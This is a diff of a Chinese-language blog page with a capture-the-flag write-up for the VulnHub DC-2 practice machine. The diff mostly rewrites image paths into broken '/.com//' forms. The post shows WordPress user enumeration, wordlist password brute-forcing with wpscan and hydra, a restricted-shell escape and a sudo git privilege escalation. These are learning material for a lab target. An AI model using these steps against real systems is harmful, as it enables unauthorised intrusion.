@@ -41,24 +41,24 @@
 <meta property="og:url" content="http://example.com/posts/e4e28081/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/e4e28081/flag1.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/nikto1.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/wpscan1.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/wpscan2.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/flag2.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/flag12.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/rbashnotfound.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/flag3.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/git1.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/git2.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/git3.png">
-<meta property="og:image" content="http://example.com/posts/e4e28081/finalflag.png">
+<meta property="og:image" content="http://example.com/.com//flag1.png">
+<meta property="og:image" content="http://example.com/.com//nikto1.png">
+<meta property="og:image" content="http://example.com/.com//wpscan1.png">
+<meta property="og:image" content="http://example.com/.com//wpscan2.png">
+<meta property="og:image" content="http://example.com/.com//flag2.png">
+<meta property="og:image" content="http://example.com/.com//flag12.png">
+<meta property="og:image" content="http://example.com/.com//rbashnotfound.png">
+<meta property="og:image" content="http://example.com/.com//flag3.png">
+<meta property="og:image" content="http://example.com/.com//git1.png">
+<meta property="og:image" content="http://example.com/.com//git2.png">
+<meta property="og:image" content="http://example.com/.com//git3.png">
+<meta property="og:image" content="http://example.com/.com//finalflag.png">
 <meta property="article:published_time" content="2021-04-30T07:29:30.000Z">
 <meta property="article:modified_time" content="2021-04-30T08:05:01.098Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="DCchallenges">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/posts/e4e28081/flag1.png">
+<meta name="twitter:image" content="http://example.com/.com//flag1.png">
 
 <link rel="canonical" href="http://example.com/posts/e4e28081/">
 
@@ -304,7 +304,7 @@
 
       
         <p>靶机DC-2下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
-<br/>
+<br>
 
 <p>环境</p>
 <blockquote>
@@ -328,23 +328,23 @@
 </blockquote>
 <p>再去访问192.168.18.132即可,发现是wordpress</p>
 <h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>点击flag 得到flag1，提示使用<code>cewl</code></p>
-<p><img src="flag1.png"></p>
+<p><img src="/.com//flag1.png"></p>
 <p>用<code>dirb</code>扫一下目录</p>
 <p>扫到一个wp-admin 去访问后会跳转到登录页面 <a target="_blank" rel="noopener" href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
 <p>这里也可以用<code>nikto</code></p>
-<p><img src="nikto1.png"></p>
+<p><img src="/.com//nikto1.png"></p>
 <h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>使用kali自带的wpscan扫一下<br><code>wpscan --url dc-2 -e u</code></p>
-<p><img src="wpscan1.png"></p>
-<br/>
+<p><img src="/.com//wpscan1.png"></p>
+<br>
 
 <p>扫到三个用户名，admin,jerry,tom<br>创建一个list存放这三个用户名</p>
-<br/>
+<br>
 
 <p>根据flag1的提示 使用<code>cewl</code>生成密码字典</p>
-<br/>
+<br>
 
 <blockquote>
-<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#114;&#x6f;&#x62;&#105;&#x6e;&#64;&#100;&#105;&#103;&#x69;&#x2e;&#x6e;&#105;&#110;&#x6a;&#97;">&#114;&#x6f;&#x62;&#105;&#x6e;&#64;&#100;&#105;&#103;&#x69;&#x2e;&#x6e;&#105;&#110;&#x6a;&#97;</a>) (<a target="_blank" rel="noopener" href="https://digi.ninja/">https://digi.ninja/</a>)</p>
+<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#111;&#x62;&#x69;&#110;&#x40;&#x64;&#105;&#103;&#x69;&#x2e;&#x6e;&#x69;&#x6e;&#106;&#x61;">&#x72;&#111;&#x62;&#x69;&#110;&#x40;&#x64;&#105;&#103;&#x69;&#x2e;&#x6e;&#x69;&#x6e;&#106;&#x61;</a>) (<a target="_blank" rel="noopener" href="https://digi.ninja/">https://digi.ninja/</a>)</p>
 <p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
 </blockquote>
 <p>使用wpscan爆破</p>
@@ -352,9 +352,9 @@
 <p>kali@kali2020:~/Desktop$ wpscan –url dc-2 -U dc-2users.list  -P dc-2.dic </p>
 <p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
 </blockquote>
-<p><img src="wpscan2.png"></p>
+<p><img src="/.com//wpscan2.png"></p>
 <p>使用tom 成功登录，发现有篇名为hello-word的文章进去看看</p>
-<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2<br><img src="flag2.png"><br><img src="flag12.png"><br>flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
+<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2<br><img src="/.com//flag2.png"><br><img src="/.com//flag12.png"><br>flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
 <p>使用hydra爆破ssh</p>
 <blockquote>
 <p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
@@ -366,14 +366,14 @@
 <blockquote>
 <p>-rbash: sudo: command not found</p>
 </blockquote>
-<p><img src="rbashnotfound.png"></p>
+<p><img src="/.com//rbashnotfound.png"></p>
 <p><strong>-rbash绕过</strong><br>解决方案 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a </span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>
-<p><img src="flag3.png"></p>
+<p><img src="/.com//flag3.png"></p>
 <p>得到flag3</p>
 <h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>根据flag3提示，使用<code>su</code>切换到jerry用户下<br><code>cat /etc/passwd </code>发现Jerry用户<br>输入之前爆破出来的密码成功登录Jerry用户</p>
 <blockquote>
-<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br><br/><br><br/></p>
+<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
 </blockquote>
 <h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>查看sudo 支持的免密命令</p>
 <blockquote>
@@ -386,7 +386,7 @@
 <blockquote>
 <p>sudo git -p –help</p>
 </blockquote>
-<p><img src="git1.png"><br><img src="git2.png"><br><img src="git3.png"><br><img src="finalflag.png"></p>
+<p><img src="/.com//git1.png"><br><img src="/.com//git2.png"><br><img src="/.com//git3.png"><br><img src="/.com//finalflag.png"></p>
 <p><strong>总结</strong></p>
 <ul>
 <li> rbash绕过</li>
